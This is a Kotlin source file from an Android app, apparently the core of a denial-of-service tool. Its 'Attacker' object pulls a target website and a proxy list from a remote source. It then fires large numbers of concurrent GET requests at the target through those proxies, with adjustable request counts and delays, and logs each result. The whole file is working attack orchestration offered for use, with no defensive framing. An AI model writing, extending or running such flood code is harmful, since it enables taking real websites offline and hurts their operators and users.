package com.bodiart.attack

import android.util.Log
import com.bodiart.attack.model.entity.data.AttackConfig
import com.bodiart.attack.model.entity.data.RequestMethod
import com.bodiart.attack.model.entity.data.RequestResponse
import com.bodiart.attack.model.entity.data.WebsiteAndProxies
import com.bodiart.attack.model.entity.data.proxy.ProxyInfo
import com.bodiart.attack.model.entity.data.website.Website
import com.bodiart.attack.model.usecase.AttackUseCase
import com.bodiart.attack.model.usecase.WebsiteAndProxiesGetUseCase
import io.github.bodiart.utils.util.extensions.process
import kotlinx.coroutines.*

object Attacker {
    private val tag = Attacker::class.java.simpleName

    private var attackJob: Job? = null
    private var isEnabled = false

    private var websiteAndProxies: WebsiteAndProxies? = null

    var attackEnableStatusCallback: ((Boolean) -> Unit)? = null

    var websiteGetSuccessCallback: ((String) -> Unit)? = null
    var websiteGetFailedCallback: ((Throwable) -> Unit)? = null
    var websiteEmptyCallback: (() -> Unit)? = null

    var handleRequestResponseCallback: ((RequestResponse) -> Unit)? = null
    var handleRequestErrorCallback: ((url: String, Throwable) -> Unit)? = null

    var allThreadExecutedCallback: ((url: String) -> Unit)? = null

    fun startAttack(
        coroutineScope: CoroutineScope,
        asyncRequestCount: Int,
        delayBetweenAllThreadsExecutedMillis: Long
    ): Job {
        setEnabled(true)
        return coroutineScope.launch {
            // setup website and proxies
            if (!setupWebsiteAndProxies()) {
                setEnabled(false)
                return@launch
            }
            // start attack for website
            websiteAndProxies?.let { websiteAndProxies ->
                performAttackForWebsite(
                    websiteAndProxies.website,
                    websiteAndProxies.proxies,
                    asyncRequestCount,
                    delayBetweenAllThreadsExecutedMillis,
                    this
                )
            }

        }.apply { attackJob = this }
    }

    fun stopAttack() {
        setEnabled(false)
    }

    /**
     * Returns is success
     */
    private suspend fun setupWebsiteAndProxies(): Boolean = withContext(Dispatchers.IO) {
        if (!handleWebsiteAndProxies(WebsiteAndProxiesGetUseCase().perform())) {
            return@withContext false
        }

        // check is websites empty
        if (websiteAndProxies == null) {
            websiteEmptyCallback?.invoke()
            return@withContext false
        }

        true
    }

    private fun handleWebsiteAndProxies(websiteResult: Result<WebsiteAndProxies>): Boolean {
        websiteResult.process(
            {
                websiteAndProxies = it
                websiteGetSuccessCallback?.invoke(it.website.url)
            },
            {
                websiteGetFailedCallback?.invoke(it)
            }
        )
        return websiteResult.isSuccess
    }

    private fun performAttackForWebsite(
        website: Website,
        proxies: List<ProxyInfo>,
        asyncRequestCount: Int,
        delayBetweenAllThreadsExecutedMillis: Long,
        coroutineScope: CoroutineScope
    ): Job {
        return AttackUseCase().perform(
            coroutineScope,
            AttackConfig(
                website.url,
                RequestMethod.GET,
                mapOf(),
                null,
                null,
                delayBetweenAllThreadsExecutedMillis,
                proxies
            ),
            asyncRequestCount,
            handleRequestResponseCallback = {
                handleRequestResponseCallback?.invoke(it)
                Log.d(tag, "request succeed code=${it.code} url=${website.url} proxy=${it.proxy?.url}:${it.proxy?.port}")
            },
            handleRequestErrorCallback = { throwable, proxy ->
                handleRequestErrorCallback?.invoke(website.url ,throwable)
                Log.d(tag, "request failed code=${throwable.message} url=${website.url} proxy=${proxy?.url}:${proxy?.port}")
            },
            allThreadsExecutedCallback = {
                allThreadExecutedCallback?.invoke(it)
                Log.d(tag, "all threads executed $it")
            }
        )
    }

    private fun setEnabled(enabled: Boolean) {
        isEnabled = enabled
        attackEnableStatusCallback?.invoke(isEnabled)
        if (!isEnabled) {
            attackJob?.cancel()
            attackJob = null
        }
    }

}